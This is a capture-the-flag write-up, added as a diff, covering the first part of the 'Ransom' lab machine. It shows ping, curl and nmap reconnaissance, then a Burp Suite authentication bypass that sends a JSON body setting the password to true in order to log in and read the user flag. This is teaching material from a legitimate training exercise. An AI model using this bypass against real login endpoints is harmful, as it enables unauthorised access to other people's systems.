@@ -1,0 +1,183 @@
+Today we will be focusing on the Ransom machine, it shows us how important good web framework design and secure configurations are. 
+
+When enginners are working with web frameworks and front-end development it is crucial to ensure that user input data cannot be
+easily manipulated to bypass authentication login checks.
+
+So let us begin
+
+like always we establish connection by setting up our VPN.
+
+After that we ensure we have a connection to host using ping -c3 (c3 means to ping only three times then quit)
+
+$ ping -c3 10.10.11.153   
+PING 10.10.11.153 (10.10.11.153) 56(84) bytes of data.
+64 bytes from 10.10.11.153: icmp_seq=1 ttl=63 time=60.8 ms
+64 bytes from 10.10.11.153: icmp_seq=2 ttl=63 time=61.1 ms
+64 bytes from 10.10.11.153: icmp_seq=3 ttl=63 time=60.8 ms
+
+--- 10.10.11.153 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, 
+
+as we see we have a strong connection.
+
+from here we start our host enumeration process with several reconnissance tools.
+
+
+Curl stands for "Client URL"
+
+
+ curl -vv 10.10.11.153
+*   Trying 10.10.11.153:80...
+* Connected to 10.10.11.153 (10.10.11.153) port 80 (#0)
+> GET / HTTP/1.1
+> Host: 10.10.11.153
+> User-Agent: curl/7.83.1
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 302 Found
+< Date: Wed, 13 Jul 2022 16:15:09 GMT
+< Server: Apache/2.4.41 (Ubuntu)
+< Cache-Control: no-cache, private
+< Location: http://10.10.11.153/login
+< Set-Cookie: XSRF-TOKEN=eyJpdiI6IjhpQjhWYWpZeHdXcmdyZmRxWjNCVkE9PSIsInZhbHVlIjoiaE03WmVOeG9oZjBrUUVHRnZzNnpBRzR2cEtwL2hiaWk5cFNmaDd2ck5DRG9KdVVQTzRSellNL3RuSmFMWXVKRXFHUU52NW10V2JFbUJmK2laMi9NcVhmZDlqZG1XSVE1UlRYUy8zV1BOUHlqaEcweklHK3FMdUhpTzYxQmpPc3QiLCJtYWMiOiJkNjNjZjFhNjZmYTAyNzNlOGYwMTU1MWVhMjA2MTgwMzkwY2U5ZWFjMWJjNTBiYjQ5MTUxNzRlNDEzN2RmM2ExIiwidGFnIjoiIn0%3D; expires=Wed, 13-Jul-2022 18:15:09 GMT; Max-Age=7200; path=/; samesite=lax
+< Set-Cookie: laravel_session=eyJpdiI6IlUzRnZjM1I0T3E3a3lIUDFqdEovOUE9PSIsInZhbHVlIjoiQ0hCWEVjZzB4Q09HbWRXR0t4djQzdFVKMjFwNUdPUS8zSWZsam81aEsxNlNCNVlQMUcweWNiS0ZoKytPSXNpTzV0enNpWWlISWU0V2pxMU41UXZ0eUN4WnI4djg3c0drKzNUMzRJdzBOZCtXazVIRC8vN2ROSmM1WDdPcUUrWWUiLCJtYWMiOiI4ODk1MmE5MWVmM2Q1OTE4ZDEzNjM1ZDQ0YzVmM2UyMGNlZjU4MjBjZDNjOTBhN2VjNGU4NTUzOTJlYzNmNzUzIiwidGFnIjoiIn0%3D; expires=Wed, 13-Jul-2022 18:15:09 GMT; Max-Age=7200; path=/; samesite=lax
+< Content-Length: 346
+< Content-Type: text/html; charset=UTF-8
+< 
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="0;url='http://10.10.11.153/login'" />
+
+        <title>Redirecting to http://10.10.11.153/login</title>
+    </head>
+    <body>
+        Redirecting to <a href="http://10.10.11.153/login">http://10.10.11.153/login</a>.
+    </body>
+* Connection #0 to host 10.10.11.153 left intact
+</html>                                                                                
+
+
+
+
+
+
+Reading left to right we see that the connection is port 80 (http, party like its 1994) 
+
+we also see a 302 message which is a redirect, we also see an Apache Server running 2.4.41 (Ubuntu)
+
+we also see cookies!!!
+
+XSRF- Token  & 
+Laravel_session 
+
+
+sooo from here we assume this box will be Larevel based.
+
+Larevel is the most famous PHP framework, used to build web apps, it claims it is a "PHP Framework for Web Artisans".
+
+
+now it is time to run nmap, (I don't mind which way a person approaches a security challenge, most will start with nmap, but here I am 
+starting with other tools) 
+
+└─$ nmap -T4 -A -vv 10.10.11.153
+└─$ nmap -T4 -A -vv 10.10.11.153
+
+Discovered open port 80/tcp on 10.10.11.153
+Discovered open port 22/tcp on 10.10.11.153
+
+here we can just start attacking port 22 with a classic Nmap script but this has never worked for me, it really only shows how easy it is to 
+start attacking a port on a server. If we can pull registered names we will come back to this with a custom userlist.
+
+ORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+
+open ssh port 22 on Ubuntu and 
+
+http on port 80 in Ubuntu Apache 
+
+we knew some this already
+
+the machine is linux so thats classy 
+
+
+
+
+
+lets pull this bad boy up in browser
+
+we see this "E Corp Incident Response Secure File Transfer"
+
+We see the login prompt, invalid login using "1234"
+
+we now should startup Burpsuite to view the data being passed from our side.....
+
+while that is starting we always want to see the source code behind the page,
+
+
+<script>
+$(document).ready(function() {
+
+  $('#loginform').submit(function() {
+
+      $.ajax({
+          type: "GET",
+          url: 'api/login',
+          data: {
+              password: $("#password").val()
+          },
+          success: function(data)
+          {
+              if (data === 'Login Successful') {
+                  window.location.replace('/');
+              }
+              else {
+                (document.getElementById('alert')).style.visibility = 'visible';
+                document.getElementById('alert').innerHTML = 'Invalid Login';
+
+              }
+          }
+      });     
+      return false; 
+  });
+});
+
+
+
+....and we get a api get request with the password being sent....
+
+we also see that the script literally contains an "if data is equal to successful login" then it give a simple "/" 
+
+"or else...." redirect...
+
+so from here our burpsuite is up and running, we turn on proxy intercept mode, reload the login page and this time capture the attempted login
+
+lets again use "1234" as password
+
+
+from here we send this badboy into our repeater module and we fire away
+
+
+using burpsuite we can modify traffic using /login page, add in JSON document at end of page in repeater, get rid of "?/password=..."
+
+
+{
+"password": true
+}
+
+we send this off (remember to remove the original password you entered in page)
+
+and we get a "200"!!! login successful!!!
+
+from here we reload to the redirect mentioned earlier "/"
+
+we see a page with a user.txt file, I dont download it but rather just pull it up on web browser http://10.10.11.153/user.txt
+
+http://10.10.11.153/user.txt
+
+http://10.10.11.153/user.txt
+
+#################### 
+this concludes first part of this machine
